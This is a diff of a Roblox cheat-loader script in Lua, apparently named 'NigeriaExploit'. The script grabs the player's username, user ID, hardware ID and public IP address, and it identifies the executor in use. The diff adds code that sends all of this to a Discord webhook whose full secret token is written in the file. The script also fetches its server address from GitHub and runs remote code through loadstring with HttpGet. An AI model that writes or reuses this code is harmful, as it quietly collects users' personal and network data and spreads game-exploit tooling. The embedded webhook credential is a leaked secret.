@@ -19,58 +19,50 @@ print("Wi.~!X$?!-~    : ?$$$B$Wu(\"**$RM!")
 print("$R@i.~~ !     :   ~$$$$$B$$en:``")
 print("?MXT@Wx.~    :     ~\"##*$$$$M~")
 
+--// Services
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local RunService = game:GetService("RunService")
 local MarketplaceService = game:GetService("MarketplaceService")
 local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
 
+--// Local Player Check
 local LocalPlayer = Players.LocalPlayer
 if not LocalPlayer then
     warn("LocalPlayer not found. This script should run as a LocalScript.")
     return
 end
 
-local UserId = LocalPlayer.UserId
-local DisplayName = LocalPlayer.DisplayName
+--// Basic Info
 local Username = LocalPlayer.Name
+local DisplayName = LocalPlayer.DisplayName
+local UserId = LocalPlayer.UserId
 local HWID = RbxAnalyticsService:GetClientId()
+local Country = game.LocalizationService.RobloxLocaleId
 
+-- Game Name
 local GameName = "Unknown Game"
 pcall(function()
     GameName = MarketplaceService:GetProductInfo(game.PlaceId).Name
 end)
 
-local Country = game.LocalizationService.RobloxLocaleId
+-- Console Launch String
+local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
 
--- IP fetching - wrapped safely because game:HttpGet can error
+-- Safe HTTP GET wrapper
 local function safeHttpGet(url)
     local success, result = pcall(function()
         return game:HttpGet(url)
     end)
-    if success then
-        return result
-    else
-        return "Unknown"
-    end
+    return success and result or "Unknown"
 end
 
 local GetIp = safeHttpGet("https://v4.ident.me/")
 local GetData = safeHttpGet("http://ip-api.com/json")
 
-local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'
-
--- Get HWID using RbxAnalyticsService (your original function)
-local function getHWID()
-    local success, hwid = pcall(function()
-        return game:GetService("RbxAnalyticsService"):GetClientId()
-    end)
-    return success and hwid or "unknown"
-end
-
--- --- Dynamic API URL Fetching ---
+-- Dynamic API URL Fetching
 local GITHUB_URL_SOURCE = "https://raw.githubusercontent.com/0XXXMAXXX0/APIWhitelist/refs/heads/main/sigma.txt"
-local BASE_API_URL = "" -- Will store API URL fetched
+local BASE_API_URL = ""
 
 local function fetchApiUrlFromGithub()
     local success, response = pcall(function()
@@ -78,111 +70,92 @@ local function fetchApiUrlFromGithub()
     end)
 
     if success and response and #response > 0 then
-        BASE_API_URL = response:gsub("^%s*(.-)%s*$", "%1") -- trim whitespace
+        BASE_API_URL = response:match("^%s*(.-)%s*$")
         print("✅ Fetched API URL from GitHub:", BASE_API_URL)
         return true
     else
-        warn("❌ Failed to fetch API URL from GitHub:", response or "Empty response")
-        print("Using fallback API URL (if available) or stopping script.")
+        warn("❌ Failed to fetch API URL:", response or "Empty")
         return false
     end
 end
 
--- Whitelist verification (your exact original code)
+-- Whitelist Check
 local function checkWhitelist()
     if BASE_API_URL == "" then
-        print("❌ Base API URL not set. Cannot proceed with whitelist check.")
-        LocalPlayer:Kick("❌ Unable to connect to verification server. Please try again.")
+        LocalPlayer:Kick("❌ Unable to connect to verification server.")
         return false
     end
 
-    local verify_url = BASE_API_URL .. "verify?hwid=" .. HWID
-    print("🔍 Verifying with:", verify_url)
-
+    local verifyUrl = BASE_API_URL .. "verify?hwid=" .. HWID
     local success, response = pcall(function()
-        return game:HttpGet(verify_url)
+        return game:HttpGet(verifyUrl)
     end)
 
-    if not success then
-        warn("❌ API call failed:", response)
-        LocalPlayer:Kick("❌ Kan niet verbinden met verificatieserver. Probeer opnieuw.")
+    if not success or not response or #response == 0 then
+        LocalPlayer:Kick("❌ Verificatie mislukt. Probeer opnieuw.")
         return false
     end
 
-    print("📡 API Response:", response)
-
-    if not response or #response == 0 then
-        warn("❌ Empty API response")
-        LocalPlayer:Kick("❌ Lege response van verificatieserver.")
-        return false
-    end
-
-    local data_success, data = pcall(function()
+    local parsed, data = pcall(function()
         return HttpService:JSONDecode(response)
     end)
 
-    if not data_success then
-        warn("❌ Failed to parse JSON:", data)
+    if not parsed or not data then
         LocalPlayer:Kick("❌ Ongeldige response van verificatieserver.")
         return false
     end
 
-    if data and data.authorized then
-        print("✅ HWID geverifieerd! Script wordt uitgevoerd...")
+    if data.authorized then
+        print("✅ Geautoriseerd!")
         return true
     else
-        print("❌ HWID niet gewhitelist:", data)
-        LocalPlayer:Kick("❌ Je HWID is niet geautoriseerd. Neem contact op met een beheerder op Discord voor toegang.")
+        LocalPlayer:Kick("❌ Je HWID is niet geautoriseerd.")
         return false
     end
 end
 
--- Report player activity (your original code)
+-- Activity Reporting
 local function reportActivity()
-    if BASE_API_URL == "" then
-        warn("❌ Cannot report activity - no API URL set")
-        return
-    end
+    if BASE_API_URL == "" then return end
 
-    local report_url = BASE_API_URL .. "report"
-    local player_data = {
+    local reportUrl = BASE_API_URL .. "report"
+    local payload = {
         hwid = HWID,
         username = Username
     }
 
-    local success, response = pcall(function()
-        return game:HttpPost(report_url, HttpService:JSONEncode(player_data), Enum.HttpContentType.ApplicationJson)
+    local success = pcall(function()
+        game:HttpPost(reportUrl, HttpService:JSONEncode(payload), Enum.HttpContentType.ApplicationJson)
     end)
 
     if success then
-        print("✅ Activity reported to Discord bot")
+        print("✅ Activity reported.")
     else
-        warn("❌ Failed to report activity:", response)
+        warn("❌ Failed to report activity.")
     end
 end
 
--- Kick check loop (your code)
+-- Kick Check Loop
 local function checkKickStatus()
     if BASE_API_URL == "" then return end
 
-    local kick_url = BASE_API_URL .. "kick?hwid=" .. HWID
-
+    local kickUrl = BASE_API_URL .. "kick?hwid=" .. HWID
     local success, response = pcall(function()
-        return game:HttpGet(kick_url)
+        return game:HttpGet(kickUrl)
     end)
 
-    if success then
-        local data_success, data = pcall(function()
+    if success and response then
+        local parsed, data = pcall(function()
             return HttpService:JSONDecode(response)
         end)
 
-        if data_success and data and data.kick then
-            LocalPlayer:Kick("🚨 Je bent uitgezet door een beheerder via Discord bot.")
+        if parsed and data and data.kick then
+            LocalPlayer:Kick("🚨 Je bent uitgezet via Discord bot.")
         end
     end
 end
 
--- Executor detection (your code unchanged)
+-- Executor Detection
 local function detectExecutor()
     if syn then return "Synapse X" end
     if secure_load then return "Sentinel" end
@@ -190,39 +163,38 @@ local function detectExecutor()
     if KRNL_LOADED then return "Krnl" end
     if is_sirhurt_closure then return "SirHurt" end
     if identifyexecutor then
-        local success, result = pcall(identifyexecutor)
-        if success and result then return result end
+        local s, r = pcall(identifyexecutor)
+        if s and r then return r end
     end
     if _G.fluxus then return "Fluxus" end
     if _G.delta then return "Delta" end
     if _G.WRD_DEBUG or _G.WEAREDEVS then return "WeAreDevs (WRD)" end
     if _G.oxygenU then return "Oxygen U" end
     if _G.scriptware then return "Script-Ware" end
-    if get_luavm_flags then return "Script-Ware (Alternative)" end
+    if get_luavm_flags then return "Script-Ware (Alt)" end
     if _G.JJSploit then return "JJSploit" end
     if _G.Celestial then return "Celestial" end
-    if _G.Protosmasher then return "ProtoSmasher (Alternative)" end
+    if _G.Protosmasher then return "ProtoSmasher (Alt)" end
     if _G.Vega then return "Vega X" end
     if _G.Hydrogen then return "Hydrogen" end
     if _G.Arcade then return "Arcade" end
     if _G.Shadow then return "Shadow" end
     if _G.Potassium then return "Potassium" end
     local ok, env = pcall(getrenv)
-    if ok and env then
-        if env.Potassium or env.executorName == "Potassium" then return "Potassium" end
-    end
-    if gethiddenproperty or sethiddenproperty then return "Unknown (Hidden Property Access)" end
-    if getrawmetatable or setrawmetatable then return "Unknown (Raw Metatable Access)" end
-    if newcclosure or islclosure then return "Unknown (C-closure Support)" end
-    if hookfunction then return "Unknown (Function Hooking)" end
-    if protect_gui or protect_script then return "Unknown (Protection API)" end
-    if getconnections then return "Unknown (Connection Spy)" end
-    if getgenv then return "Unknown (Generic Global Environment)" end
-    if getfenv and getfenv(0) and getfenv(0).setclipboard then return "Unknown (Clipboard via setfenv)" end
-    if HttpGet or HttpPost then return "Unknown (Generic HTTP functions)" end
+    if ok and env and (env.Potassium or env.executorName == "Potassium") then return "Potassium" end
+    if gethiddenproperty or sethiddenproperty then return "Unknown (HiddenProp)" end
+    if getrawmetatable or setrawmetatable then return "Unknown (Metatable)" end
+    if newcclosure or islclosure then return "Unknown (CClosure)" end
+    if hookfunction then return "Unknown (Hook)" end
+    if protect_gui or protect_script then return "Unknown (Protect API)" end
+    if getconnections then return "Unknown (Connections)" end
+    if getgenv then return "Unknown (getgenv)" end
+    if getfenv and getfenv(0) and getfenv(0).setclipboard then return "Unknown (Clipboard)" end
+    if HttpGet or HttpPost then return "Unknown (HTTP)" end
     return "Unknown"
 end
 
+-- Blacklist
 local blacklistedHWIDs = {
     ["abc123"] = true,
     ["def456"] = true,
@@ -231,37 +203,67 @@ local blacklistedHWIDs = {
 
 local function isBlacklisted()
     if blacklistedHWIDs[HWID] then
-        warn("Blacklisted HWID detected: " .. HWID)
+        warn("Blacklisted HWID: " .. HWID)
         LocalPlayer:Kick("je HWID staat op blacklist dusss ermmmmm")
         return true
     end
     return false
 end
 
+-- Webhook Builder
 local function createWebhookData()
     local executor = detectExecutor()
     local data = {
-        embeds = {
-            {
-                title = "NigeriaExploit",
-                description = string.format(
-                    "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
-                    Username, DisplayName, UserId, HWID, GameName, executor, GetIp
-                ),
-                thumbnail = {
-                    url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
-                },
-                color = 16753920,
-                footer = { text = os.date("Logged at %Y-%m-%d %H:%M:%S") }
-            }
-        }
+        embeds = {{
+            title = "NigeriaExploit",
+            description = string.format(
+                "**Username:** %s\n**Display Name:** %s\n**User ID:** %d\n**HWID:** `%s`\n**Game:** %s\n**Exploit:** %s\n**IP:** %s\n",
+                Username, DisplayName, UserId, HWID, GameName, executor, GetIp
+            ),
+            thumbnail = {
+                url = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. UserId .. "&width=150&height=150&format=png"
+            },
+            color = 16753920,
+            footer = { text = os.date("Logged at %Y-%m-%d %H:%M:%S") }
+        }}
     }
     return HttpService:JSONEncode(data)
 end
 
+-- Webhook Sender
 local function sendWebhook(url, data)
-    local headers = {["Content-Type"]
+    local headers = {["Content-Type"] = "application/json"}
+    local requestFunc = http_request or request or (syn and syn.request)
+    if requestFunc then
+        requestFunc({
+            Url = url,
+            Method = "POST",
+            Headers = headers,
+            Body = data
+        })
+    else
+        warn("❌ No supported HTTP request method found.")
+    end
+end
 
+-- Webhook URL
+local webhookUrl = "https://discordapp.com/api/webhooks/1392498264451842139/aaO4ISZQOkYYaqVvxlh2ZFw2oocBGO4PBaa-oRD_mODb9hZTn5o54av-G9k1S9rkOv1M"
+
+-- Main Execution
+print("🔄 Fetching API URL from GitHub...")
+if not isBlacklisted() and fetchApiUrlFromGithub() and checkWhitelist() then
+    reportActivity()
+    sendWebhook(webhookUrl, createWebhookData())
+
+    RunService.Heartbeat:Connect(function()
+        task.wait(5)
+        checkKickStatus()
+    end)
+
+    print("✅ Script gestart! Welkom,", Username)
+else
+    warn("❌ Script niet uitgevoerd - verificatie of blacklist check gefaald.")
+end
 
 print("Made By trex.gg en eclipse")
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
